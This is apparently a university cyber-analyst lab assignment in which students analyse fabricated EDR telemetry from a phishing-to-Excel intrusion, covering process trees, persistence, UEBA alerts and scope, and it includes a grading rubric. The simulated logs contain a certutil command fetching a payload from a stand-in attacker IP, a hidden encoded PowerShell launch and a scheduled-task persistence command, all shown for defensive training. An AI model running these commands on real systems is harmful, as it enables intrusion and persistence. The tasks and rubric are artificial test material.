# Lab Activity: Module 06 - Endpoint Detection and Response

## Course: CIS-4332 Cyber Analyst | Texas Wesleyan University

## Instructor: Professor Nash

## CySA+ CS0-003 Domain: Domain 1 - Security Operations (33%)

---

## Lab Overview

In this lab you will analyze simulated EDR telemetry — process trees, timeline events, file operations, and registry changes — to identify attack patterns, classify malicious activity by ATT&CK technique, and recommend response actions. All telemetry data is provided within this document. No EDR software installation is required.

Total Points: 100

Estimated Completion Time: 75-90 minutes

Submission: Upload your completed Lab Report to the Canvas Module 06 Lab assignment.

---

## Learning Objectives

By completing this lab you will be able to:

- Analyze a process tree to identify suspicious parent-child execution chains
- Recognize LOLBin abuse from command-line arguments and parent-process context
- Identify persistence mechanisms in registry and scheduled task telemetry
- Map endpoint attack behaviors to ATT&CK tactics and techniques
- Recommend appropriate EDR response actions for a confirmed endpoint compromise

---

## Exercise 1: Process Tree Analysis (35 points)

### Exercise 1 Overview

The following process tree was captured by an EDR platform on endpoint WS-ACCTG-12, a Windows 10 workstation assigned to an accounts payable employee. The intrusion began at approximately 14:22 UTC on November 14, 2024. Review the complete process tree and answer the questions that follow.

### Process Tree — WS-ACCTG-12

```text
[14:21:44]  explorer.exe (PID 1824)  [User: jdoe]
    |
    +-- [14:22:01]  OUTLOOK.EXE (PID 3312)  [User: jdoe]
            |
            +-- [14:22:47]  EXCEL.EXE (PID 4488)  [User: jdoe]
                    |
                    +-- [14:22:52]  cmd.exe (PID 5120)  [User: jdoe]
                            |
                            +-- [14:22:54]  powershell.exe (PID 5244)
                            |       CommandLine: powershell.exe -NoProfile -NonInteractive
                            |                   -WindowStyle Hidden
                            |                   -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0A
                            |
                            +-- [14:23:11]  certutil.exe (PID 5399)
                            |       CommandLine: certutil.exe -urlcache -f
                            |                   http://198.51.100.47/stage2.exe
                            |                   C:\Users\jdoe\AppData\Temp\svcmon.exe
                            |
                            +-- [14:23:14]  svcmon.exe (PID 5412)
                                    |       Path: C:\Users\jdoe\AppData\Temp\svcmon.exe
                                    |       Hash: a3f5b2c1d4e6a7b8c9d0e1f2a3b4c5d6
                                    |       Network: 198.51.100.47:4444 [TCP ESTABLISHED]
                                    |
                                    +-- [14:23:19]  schtasks.exe (PID 5501)
                                    |       CommandLine: schtasks /Create /SC MINUTE /MO 5
                                    |                   /TN "WindowsSystemUpdate"
                                    |                   /TR "C:\Users\jdoe\AppData\Temp\svcmon.exe"
                                    |                   /RU jdoe
                                    |
                                    +-- [14:23:22]  whoami.exe (PID 5512)
                                    +-- [14:23:23]  ipconfig.exe (PID 5514) [/all]
                                    +-- [14:23:24]  net.exe (PID 5516) [user]
                                    +-- [14:23:25]  net.exe (PID 5518) [localgroup administrators]
                                    +-- [14:23:31]  arp.exe (PID 5522) [-a]
```

### Task 1A — Process Tree Annotation (15 points)

For each of the seven suspicious process events listed below, identify: (1) why the process or its execution context is suspicious, and (2) the ATT&CK tactic and technique it represents. Answer in 2-3 sentences per entry.

Entry to analyze: EXCEL.EXE spawning cmd.exe at 14:22:52

Entry to analyze: powershell.exe with -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand at 14:22:54

Entry to analyze: certutil.exe with -urlcache -f arguments at 14:23:11

Entry to analyze: svcmon.exe executing from AppData\Temp\ at 14:23:14

Entry to analyze: svcmon.exe establishing a TCP connection to 198.51.100.47:4444 at 14:23:14

Entry to analyze: schtasks.exe creating task "WindowsSystemUpdate" at 14:23:19

Entry to analyze: The sequence whoami, ipconfig, net user, net localgroup, arp at 14:23:22 to 14:23:31

Scoring: 2 points per entry — 1 for accurate suspicious reason, 1 for correct ATT&CK tactic and technique.

### Task 1B — Root Cause Identification (10 points)

In 5-7 sentences, trace the full attack chain from initial access through post-compromise activity. Your narrative should:

1. Identify the most likely initial access vector based on the process tree
2. Explain what the attacker accomplished at each significant step
3. Map the full chain to a sequence of ATT&CK tactics in chronological order
4. Explain why this attack chain is likely to evade traditional antivirus

### Task 1C — LOLBin Identification (10 points)

Identify every LOLBin used in the process tree above. For each, state its normal purpose, describe how it was abused in this scenario, and identify the ATT&CK technique for its malicious use. Use the LOLBin reference table from the Reading Guide.

---

## Exercise 2: Registry and Persistence Analysis (25 points)

### Exercise 2 Overview

The EDR platform captured the following registry and file system events on the same endpoint during the 14:22-14:30 UTC window. Review the events and complete the tasks below.

### Registry and File System Events

```text
[14:23:20]  REGISTRY WRITE
    Key:   HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    Value: WindowsUpdateService
    Data:  C:\Users\jdoe\AppData\Roaming\Updater\updater.exe
    Actor: svcmon.exe (PID 5412)

[14:23:24]  FILE CREATE
    Path:  C:\Users\jdoe\AppData\Roaming\Updater\updater.exe
    Hash:  a3f5b2c1d4e6a7b8c9d0e1f2a3b4c5d6
    Actor: svcmon.exe (PID 5412)
    Note:  Hash matches svcmon.exe (same binary, different name)

[14:24:01]  FILE CREATE
    Path:  C:\Users\jdoe\AppData\Roaming\Microsoft\Windows\Start Menu\
           Programs\Startup\svc_helper.lnk
    Actor: svcmon.exe (PID 5412)
    Note:  Shortcut targeting C:\Users\jdoe\AppData\Roaming\Updater\updater.exe

[14:25:10]  REGISTRY WRITE
    Key:   HKLM\SYSTEM\CurrentControlSet\Services\WinSystemMon
    Value: ImagePath
    Data:  C:\Users\jdoe\AppData\Temp\svcmon.exe
    Actor: svcmon.exe (PID 5412)
    Note:  Service creation requires elevation; this write succeeded unexpectedly
```

### Task 2A — Persistence Mechanism Identification (15 points)

For each of the four events above, answer the following questions (3 points each, plus 3 points for Task 2A-5):

Task 2A-1: Identify the persistence technique represented by the HKCU Run key write. Name the ATT&CK technique ID and explain how this mechanism ensures the malicious binary executes at every user logon.

Task 2A-2: Identify the persistence technique represented by the Startup folder shortcut creation. Name the ATT&CK technique ID and explain how this mechanism differs from the Run key in terms of which user context it affects.

Task 2A-3: Identify the persistence technique represented by the service creation attempt. Name the ATT&CK technique ID and explain what the note "requires elevation; this write succeeded unexpectedly" implies about the attacker's privilege level.

Task 2A-4: The file hash for updater.exe matches svcmon.exe. In 2-3 sentences, explain the security significance of the attacker using the same binary with different names in different locations.

Task 2A-5: Across all four events, how many distinct ATT&CK persistence techniques are represented? List each technique ID and name, and explain in one sentence why using multiple redundant persistence mechanisms benefits the attacker.

### Task 2B — Containment Decision (10 points)

You have confirmed this is a true positive. You have EDR remote response capabilities available. In 5-6 sentences, describe your immediate containment actions in priority order. For each action, explain what it accomplishes and what investigation risk you accept by taking it. Address: network isolation, process termination, and the sequence in which you would perform these actions.

---

## Exercise 3: UEBA Scenario Analysis (25 points)

### Exercise 3 Overview

The following three behavioral alerts were generated by the UEBA component of the EDR platform. For each alert, analyze whether it represents a true security concern and recommend an action.

### UEBA Alert 3-01

```text
User: sarah.johnson  (Finance Director)
Alert: Significant Behavioral Deviation — Authentication
Baseline: User authenticates exclusively from CORP-LT-045 (10.0.1.45)
          Monday-Friday 08:00-18:30 CST. No after-hours logins in 14 months.
Observed: Successful login at 02:14 AM CST on Saturday from source IP 10.0.9.88
          (asset: TEMP-LAPTOP-003, a shared device in the conference room).
          Following login: accessed CFO-SHARE (executive financial data) for 48 minutes.
          Downloaded: 3 files totaling 847 MB.
```

### UEBA Alert 3-02

```text
User: backup_svc (Service Account)
Alert: Significant Behavioral Deviation — Source Location
Baseline: backup_svc authenticates only from 10.0.5.10 (backup server)
          and 10.0.5.11 (backup server secondary) between 01:00 and 04:00 UTC daily.
Observed: Successful Kerberos authentication at 14:33 UTC from 10.0.4.88
          (asset: WS-ACCTG-12 — same workstation from Exercise 1).
          Followed by: SMB access to DOMAIN-CONTROLLER-01 at 14:34 UTC.
```

### UEBA Alert 3-03

```text
User: m.rodriguez  (Software Developer)
Alert: Moderate Behavioral Deviation — Data Access Volume
Baseline: User accesses DEV-SHARE and CODE-REPO daily.
          Accesses HR-SHARE approximately once per quarter for 1-2 files.
Observed: User accessed HR-SHARE today and downloaded 412 files over 2 hours.
          Downloaded files are employee performance records and compensation data.
Note: User submitted a resignation letter this morning. Manager confirmed in HR system.
```

### Task 3A — Alert Triage and Classification (15 points)

For each of the three UEBA alerts, answer the following in 4-6 sentences per alert (5 points each):

1. Is this alert more likely a true positive or false positive? Justify using the specific behavioral deviations described.
2. What is the most likely explanation for the observed behavior — malicious, unauthorized, or legitimate?
3. What one additional piece of evidence would most definitively confirm or rule out a malicious explanation?

### Task 3B — UEBA vs. Rule-Based Detection Comparison (10 points)

In 6-8 sentences, explain why UEBA Alert 3-02 would not have been detected by a standard SIEM rule-based detection system. Your answer should address: what field values a rules-based system would have evaluated, why those values appear legitimate, and what specific capability UEBA has that allows it to detect this event where rule-based systems cannot.

---

## Exercise 4: Cross-Endpoint Scope Assessment (15 points)

### Exercise 4 Overview

After confirming the compromise on WS-ACCTG-12, your team uses the EDR platform's cross-endpoint query capability to search for related indicators across the entire environment.

### Search Results

```text
Query: file hash a3f5b2c1d4e6a7b8c9d0e1f2a3b4c5d6 across all endpoints

Results:
- WS-ACCTG-12     jdoe            14:23:14  C:\Users\jdoe\AppData\Temp\svcmon.exe
- WS-HR-07        k.thomas        14:45:02  C:\Users\k.thomas\AppData\Temp\svcmon.exe
- WS-EXEC-03      ceo_assistant   15:12:44  C:\Users\ceo_assistant\Downloads\invoice_update.exe
- LAPTOP-SALES-22 r.martinez      15:44:19  C:\Users\r.martinez\AppData\Local\Temp\svcmon.exe

Query: scheduled task name "WindowsSystemUpdate" across all endpoints

Results: WS-ACCTG-12, WS-HR-07, WS-EXEC-03, LAPTOP-SALES-22 (all four)

Query: outbound connection to 198.51.100.47:4444

Results: WS-ACCTG-12 (established), WS-HR-07 (established),
         WS-EXEC-03 (connection attempt — blocked by firewall),
         LAPTOP-SALES-22 (established)
```

### Task 4A — Scope Assessment (8 points)

Based on the search results, answer the following in 5-6 sentences:

1. How many endpoints are confirmed compromised versus potentially compromised? Explain your classification.
2. What does the WS-EXEC-03 "connection attempt blocked" result mean for the status of that endpoint?
3. What does the variation in file names (svcmon.exe vs. invoice_update.exe) across endpoints tell you about how the initial access occurred on each system?

### Task 4B — Incident Scope and Response Prioritization (7 points)

In 4-5 sentences, prioritize the four endpoints for containment and explain your ordering. Consider: which systems have active C2 connections, which have the highest asset criticality based on user role, and whether isolating a system in network isolation would disrupt critical business operations.

---

## Grading Rubric

| Exercise | Points | Grading Criteria |
|---|---|---|
| Exercise 1A — Process Tree Annotation | 15 | 2 pts per entry; correct suspicious reason and ATT&CK mapping |
| Exercise 1B — Root Cause Identification | 10 | Complete chain; ATT&CK tactic sequence; AV evasion explanation |
| Exercise 1C — LOLBin Identification | 10 | All LOLBins named; normal vs. malicious use; technique IDs correct |
| Exercise 2A — Persistence Analysis | 15 | Correct technique IDs; elevation implication; redundancy reasoning |
| Exercise 2B — Containment Decision | 10 | Priority order justified; investigation risk acknowledged for each action |
| Exercise 3A — UEBA Alert Triage | 15 | Correct TP/FP classification; most likely explanation; confirming evidence identified |
| Exercise 3B — UEBA vs. Rule-Based | 10 | Specific field analysis; correct UEBA advantage explained |
| Exercise 4A — Scope Assessment | 8 | Correct confirmed vs. potential classification; blocked-attempt interpretation |
| Exercise 4B — Prioritization | 7 | Logical prioritization; asset criticality and C2 status considered |
| Total | 100 | |

---

## Submission Instructions

1. Use the Lab Report Template from Canvas or a clearly labeled document matching this lab's section structure.
2. Include your full name, student ID, course section, and submission date.
3. Present any command-line examples in code-formatted blocks.
4. Submit to the Canvas Module 06 Lab assignment by the posted deadline.

---

## Academic Integrity Notice

All EDR telemetry in this lab is fabricated for educational purposes. All work must be your own. Reference professormesser.com and comptia.org for additional study context.
